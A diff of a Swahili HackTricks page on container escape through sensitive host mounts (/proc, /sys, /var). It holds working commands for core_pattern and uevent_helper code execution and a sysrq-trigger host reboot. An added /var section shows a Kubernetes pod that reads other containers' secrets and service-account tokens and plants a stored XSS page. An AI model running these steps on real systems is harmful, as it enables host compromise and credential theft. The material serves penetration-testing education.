@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Ufunuo wa `/proc` na `/sys` bila kutengwa kwa namespace sahihi unaleta hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa uso wa shambulio na ufichuzi wa taarifa. Maktaba haya yana faili nyeti ambazo, ikiwa zimepangwa vibaya au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko ya mwenyeji, au kutoa taarifa zinazosaidia mashambulizi zaidi. Kwa mfano, kuunganisha vibaya `-v /proc:/host/proc` kunaweza kupita ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, na kuacha `/host/proc` bila ulinzi.
+Ufunuo wa `/proc`, `/sys`, na `/var` bila kutengwa kwa namespace sahihi kunaingiza hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa uso wa shambulio na ufunuo wa taarifa. Hizi directories zina faili nyeti ambazo, ikiwa zimepangwa vibaya au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko ya mwenyeji, au kutoa taarifa zinazosaidia mashambulizi zaidi. Kwa mfano, kuunganisha vibaya `-v /proc:/host/proc` kunaweza kupita ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, na kuacha `/host/proc` bila ulinzi.
 
 **Unaweza kupata maelezo zaidi ya kila hatari inayoweza kutokea katika** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -10,25 +10,25 @@ Ufunuo wa `/proc` na `/sys` bila kutengwa kwa namespace sahihi unaleta hatari ku
 
 ### `/proc/sys`
 
-Maktaba hii inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupitia `sysctl(2)`, na ina subdirectories kadhaa za wasiwasi:
+Hii directory inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupitia `sysctl(2)`, na ina subdirectories kadhaa za wasiwasi:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Imeelezwa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
 - Inaruhusu kufafanua programu ya kutekeleza wakati wa uzalishaji wa core-file na bytes 128 za kwanza kama hoja. Hii inaweza kusababisha utekelezaji wa msimbo ikiwa faili inaanza na bomba `|`.
-- **Mfano wa Upimaji na Ukatili**:
+- **Mfano wa Kujaribu na Kutumia**:
 
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Jaribu ufikiaji wa kuandika
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Weka mpangaji maalum
+echo "|$overlay/shell.sh" > core_pattern # Weka handler maalum
 sleep 5 && ./crash & # Trigger handler
 ```
 
 #### **`/proc/sys/kernel/modprobe`**
 
-- Imeelezwa kwa undani katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Ina njia ya mpangaji wa moduli ya kernel, inayotumika kwa kupakia moduli za kernel.
+- Imeelezwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Ina njia ya mzigo wa moduli ya kernel, inayotumika kwa kupakia moduli za kernel.
 - **Mfano wa Kuangalia Ufikiaji**:
 
 ```bash
@@ -47,9 +47,9 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia ufikiaji wa modprobe
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Inaruhusu kujiandikisha kwa wakalimani wa muundo wa binary usio wa asili kulingana na nambari zao za uchawi.
+- Inaruhusu kujiandikisha kwa waandishi wa tafsiri kwa muundo wa binary usio wa asili kulingana na nambari zao za uchawi.
 - Inaweza kusababisha kupanda kwa haki au ufikiaji wa root shell ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
-- Ukatili na maelezo yanayohusiana:
+- Uthibitisho wa husika na maelezo:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Mafunzo ya kina: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
@@ -62,7 +62,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia ufikiaji wa modprobe
 
 #### **`/proc/sysrq-trigger`**
 
-- Inaruhusu kuanzisha amri za Sysrq, ambayo inaweza kusababisha upya wa mfumo mara moja au hatua nyingine muhimu.
+- Inaruhusu kuanzisha amri za Sysrq, ambazo zinaweza kusababisha upya wa mfumo mara moja au hatua nyingine muhimu.
 - **Mfano wa Kuanzisha Upya Mwenyeji**:
 
 ```bash
@@ -72,20 +72,20 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 #### **`/proc/kmsg`**
 
 - Inafichua ujumbe wa buffer ya ring ya kernel.
-- Inaweza kusaidia katika ukatili wa kernel, uvujaji wa anwani, na kutoa taarifa nyeti za mfumo.
+- Inaweza kusaidia katika mashambulizi ya kernel, uvujaji wa anwani, na kutoa taarifa nyeti za mfumo.
 
 #### **`/proc/kallsyms`**
 
 - Inataja alama za kernel zilizotolewa na anwani zao.
-- Muhimu kwa maendeleo ya ukatili wa kernel, hasa kwa kushinda KASLR.
-- Taarifa za anwani zinapunguzwa ikiwa `kptr_restrict` imewekwa kwa `1` au `2`.
+- Muhimu kwa maendeleo ya mashambulizi ya kernel, hasa kwa kushinda KASLR.
+- Taarifa za anwani zinapunguziliwa mbali ikiwa `kptr_restrict` imewekwa kuwa `1` au `2`.
 - Maelezo katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
 
 - Inafanya kazi na kifaa cha kumbukumbu ya kernel `/dev/mem`.
 - Kihistoria ilikuwa na udhaifu wa mashambulizi ya kupanda kwa haki.
-- Zaidi juu ya [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Zaidi katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
@@ -96,17 +96,17 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 
 #### **`/proc/kmem`**
 
-- Kiolesura mbadala kwa `/dev/kmem`, kinawakilisha kumbukumbu ya virtual ya kernel.
+- Njia mbadala kwa `/dev/kmem`, inawakilisha kumbukumbu ya virtual ya kernel.
 - Inaruhusu kusoma na kuandika, hivyo kubadilisha moja kwa moja kumbukumbu ya kernel.
 
 #### **`/proc/mem`**
 
-- Kiolesura mbadala kwa `/dev/mem`, kinawakilisha kumbukumbu ya kimwili.
+- Njia mbadala kwa `/dev/mem`, inawakilisha kumbukumbu ya kimwili.
 - Inaruhusu kusoma na kuandika, kubadilisha kumbukumbu yote kunahitaji kutatua anwani za virtual hadi za kimwili.
 
 #### **`/proc/sched_debug`**
 
-- Inarudisha taarifa za kupanga mchakato, ikipita ulinzi wa namespace ya PID.
+- Inarudisha taarifa za kupanga mchakato, ikipita ulinzi wa PID namespace.
 - Inafichua majina ya mchakato, IDs, na vitambulisho vya cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
@@ -119,22 +119,22 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 #### **`/sys/kernel/uevent_helper`**
 
 - Inatumika kwa kushughulikia `uevents` za kifaa cha kernel.
-- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo na mipaka wakati wa kuanzishwa kwa `uevent`.
-- **Mfano wa Ukatili**: %%%bash
+- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo za kawaida wakati wa kuanzishwa kwa `uevent`.
+- **Mfano wa Kutumia**: %%%bash
 
 #### Inaunda payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Inapata njia ya mwenyeji kutoka kwa OverlayFS mount kwa kontena
+#### Inapata njia ya mwenyeji kutoka OverlayFS mount kwa kontena
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Inapanga uevent_helper kwa mpangaji mbaya
+#### Inaweka uevent_helper kwa msaidizi mbaya
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
-#### Inasababisha uevent
+#### Inachochea uevent
 
 echo change > /sys/class/mem/null/uevent
 
@@ -152,18 +152,107 @@ cat /output %%%
 
 #### **`/sys/kernel/security`**
 
-- Ina nyumba ya kiolesura cha `securityfs`, kinachoruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
+- Ina nyumba ya interface ya `securityfs`, inayoruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
 - Ufikiaji unaweza kuwezesha kontena kuzima mfumo wake wa MAC.
 
 #### **`/sys/firmware/efi/vars` na `/sys/firmware/efi/efivars`**
 
-- Inafichua violesura vya kuingiliana na mabadiliko ya EFI katika NVRAM.
-- Usanidi mbaya au ukatili unaweza kusababisha kompyuta zisizoweza kuanzishwa au kompyuta za mwenyeji zisizoweza kuanzishwa.
+- Inafichua interfaces za kuingiliana na mabadiliko ya EFI katika NVRAM.
+- Usanidi mbaya au matumizi yanaweza kusababisha kompyuta zisizoweza kuanzishwa au kompyuta za mwenyeji zisizoweza kuanzishwa.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` inatoa kiolesura cha "hakuna sheria" kwa ufuatiliaji wa kernel.
+- `debugfs` inatoa interface ya "hakuna sheria" ya kujaribu kernel.
 - Historia ya masuala ya usalama kutokana na asili yake isiyo na mipaka.
+
+### `/var` Vulnerabilities
+
+Folda ya mwenyeji **/var** ina sockets za wakati wa kontena na mifumo ya faili ya kontena.
+Ikiwa folda hii imeunganishwa ndani ya kontena, kontena hiyo itapata ufikiaji wa kuandika na kusoma kwenye mifumo ya faili ya kontena nyingine
+ikiwa na haki za root. Hii inaweza kutumika vibaya kuhamasisha kati ya kontena, kusababisha kukatizwa kwa huduma, au kuingiza nyuma kontena nyingine na programu zinazotumika ndani yao.
+
+#### Kubernetes
+
+Ikiwa kontena kama hii imewekwa na Kubernetes:
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+name: pod-mounts-var
+labels:
+app: pentest
+spec:
+containers:
+- name: pod-mounts-var-folder
+image: alpine
+volumeMounts:
+- mountPath: /host-var
+name: noderoot
+command: [ "/bin/sh", "-c", "--" ]
+args: [ "while true; do sleep 30; done;" ]
+volumes:
+- name: noderoot
+hostPath:
+path: /var
+```
+Ndani ya **pod-mounts-var-folder** chombo:
+```bash
+/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null
+
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh
+
+/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
+JWT_SECRET=85d<SNIP>a0
+REFRESH_TOKEN_SECRET=14<SNIP>ea
+
+/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
+
+/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
+are/nginx/html/index2.html
+```
+The XSS ilifikiwa:
+
+![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
+
+Kumbuka kwamba kontena HALIHITAJI kuanzishwa upya au chochote. Mabadiliko yoyote yaliyofanywa kupitia folda iliyowekwa **/var** yatafanyika mara moja.
+
+Unaweza pia kubadilisha faili za usanidi, binaries, huduma, faili za programu, na profaili za shell ili kufikia RCE ya kiotomatiki (au ya nusu-kiotomatiki).
+
+##### Ufikiaji wa akidi za wingu
+
+Kontena linaweza kusoma tokeni za K8s serviceaccount au tokeni za AWS webidentity ambazo zinamruhusu kontena kupata ufikiaji usioidhinishwa kwa K8s au wingu:
+```bash
+/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
+/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+```
+#### Docker
+
+Ukatili katika Docker (au katika matumizi ya Docker Compose) ni sawa kabisa, isipokuwa kwamba kawaida
+faili za mifumo ya faili ya kontena zingine zinapatikana chini ya njia tofauti ya msingi:
+```bash
+$ docker info | grep -i 'docker root\|storage driver'
+Storage Driver: overlay2
+Docker Root Dir: /var/lib/docker
+```
+Hivyo mifumo ya faili iko chini ya `/var/lib/docker/overlay2/`:
+```bash
+$ sudo ls -la /var/lib/docker/overlay2
+
+drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
+drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
+drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
+drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+<SNIP>
+```
+#### Note
+
+Njia halisi zinaweza kutofautiana katika mipangilio tofauti, ndiyo maana njia bora ni kutumia amri ya **find** kutafuta mifumo ya faili ya kontena zingine.
 
 ### References
 
